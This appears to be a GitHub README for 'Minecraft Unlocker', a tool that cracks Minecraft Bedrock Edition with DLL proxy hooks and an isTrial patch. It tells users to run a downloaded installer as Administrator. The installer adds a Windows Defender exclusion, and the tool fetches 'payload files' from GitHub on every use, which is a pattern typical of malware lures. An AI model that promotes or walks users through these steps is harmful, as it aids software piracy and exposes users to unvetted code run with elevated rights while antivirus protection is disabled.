# Minecraft Unlocker by errortechh

A tool to unlock Minecraft for Windows (Bedrock Edition).

## 🚀 Quick Install

1. Download [`mc_installer.exe`](https://github.com/krinjalku/FIXMINECRAFTFILES/releases/latest/download/mc_installer.exe)
2. Run it (right-click → **Run as Administrator** for best results)
3. Done! Everything is set up automatically.

## 📦 What the Installer Does

- Downloads `minecraft_unlocker.exe` to `%APPDATA%\minecraft unlocker\`
- Downloads the background image
- Sets up engine configs for two unlock methods:
  - **OnlineFix Method** — winmm proxy + OnlineFix DLL hooks
  - **errortechh method** — vcruntime proxy + isTrial patch
- Creates a **desktop shortcut**
- Adds Windows Defender exclusion
- Launches the unlocker when done

## 🛠️ Manual Install

If you prefer manual installation:

1. Download `minecraft_unlocker.exe` from [Releases](../../releases/latest)
2. Place it in `%APPDATA%\minecraft unlocker\`
3. Download `premium_bg.png` from Releases and place it in the same folder
4. Run the exe

## 🗑️ Uninstall

- Delete the folder `%APPDATA%\minecraft unlocker\`
- Delete the **Minecraft Unlocker** shortcut from your desktop

## ⚙️ Features

- 🎮 **Game detection** — Auto-detects Minecraft installation
- 📥 **Auto-download** — Downloads unlock files from GitHub on every use
- 🔄 **Game tracker** — Shows "PLAYING..." while game is running, resets when closed
- 🌿 **Grass block icon** — Custom Minecraft-themed app icon
- 💻 **AppData storage** — All data stored in `%APPDATA%\minecraft unlocker\`
- 🔗 **Desktop shortcut** — Created automatically by installer

## 📁 Repository Structure

```
engine_a/          ← OnlineFix method payload files
engine_b/          ← errortechh method payload files
installer.cpp      ← Installer source code
install.bat        ← Batch installer (alternative)
install.ps1        ← PowerShell installer (alternative)
uninstall.bat      ← Uninstaller
```

## 👨‍💻 Credits

Made by **errortechh** — [YouTube](https://youtube.com/@errortechh)
